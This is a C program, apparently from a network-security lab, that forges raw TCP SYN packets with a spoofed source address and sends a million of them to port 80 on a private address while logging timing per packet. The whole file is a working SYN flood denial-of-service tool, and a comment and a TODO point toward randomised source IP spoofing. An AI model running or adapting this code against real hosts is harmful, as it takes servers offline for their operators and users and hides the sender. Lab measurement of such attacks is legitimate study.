#include<stdio.h>
#include<string.h> 
#include<sys/socket.h>
#include<stdlib.h> 
#include<errno.h> 
#include<netinet/tcp.h>	
#include<netinet/ip.h>	
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>

struct pseudo_header   
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	
	struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

int main (void)
{
	
double diff=0;	
double delta=0;
double avg=0;
  time_t t;
double timeForPacket=0;
srand((unsigned) time(&t));
	int count=0;
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

	char datagram[4096] , source_ip[32];

	struct iphdr *iph = (struct iphdr *) datagram;

	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	strcpy(source_ip , "10.0.2.5");
  
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr ("10.0.2.5");
	memset (datagram, 0, 4096);	
	

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->id = htons(54321);	
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;		
	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
	
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	
	
	tcph->source = htons (1234);
	tcph->dest = htons (80);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;	
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (5840);	
	tcph->check = 0;
	tcph->urg_ptr = 0;
	
	
	psh.source_address = inet_addr( source_ip );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);
	
	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
	
	tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
	
	
	int one = 1;
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	/*
    ////////////////////////// TODO:
									generate a random ip



*/
time_t first,beforeSend,afterSend,last;
struct tm * firstTime,*before,*after,*lastTime;
struct timeval stop, start;



  

FILE *f = fopen("syns_results_c.txt", "a+");
if (f == NULL)
{
    printf("Error opening file!\n");
    exit(1);
}
time ( &first );
  	firstTime = localtime ( &first );

         for(int i=0; i<100;i++){ //100
             for (int j=0; j<10000;j++){ //10000
		//Send the packet
            count++; // syn number
 gettimeofday(&start, NULL);
  		before = localtime ( &beforeSend );

		        if (sendto (s,		/* our socket */
					datagram,	/* the buffer containing headers and data */
					iph->tot_len,	/* total length of our datagram */
					0,		/* routing flags, normally always 0 */
					(struct sockaddr *) &sin,	/* socket addr, just like in */
					sizeof (sin)) < 0)		/* a normal send() */
		{
			printf ("error\n");
		}
		
		else
		{
			time ( &afterSend );
  			after = localtime ( &afterSend);
 gettimeofday(&stop, NULL);



timeForPacket+=((stop.tv_sec - start.tv_sec)+ (stop.tv_usec - start.tv_usec))/1000000.0;
			fprintf(f, "Syn request number: %d\nTime it took to send it: %lf seconds\n", count,((stop.tv_sec - start.tv_sec)+ (stop.tv_usec - start.tv_usec))/1000000.0);
		}
	}
 }
 time ( &last );
  	lastTime = localtime ( &last );
		  delta=difftime(last,first);
		  avg=timeForPacket/count;
	fprintf(f, "\nIt took %f seconds to send all the packets. The average time to send a packet is %f seconds",delta,avg);
fclose(f);
	return 0;
}
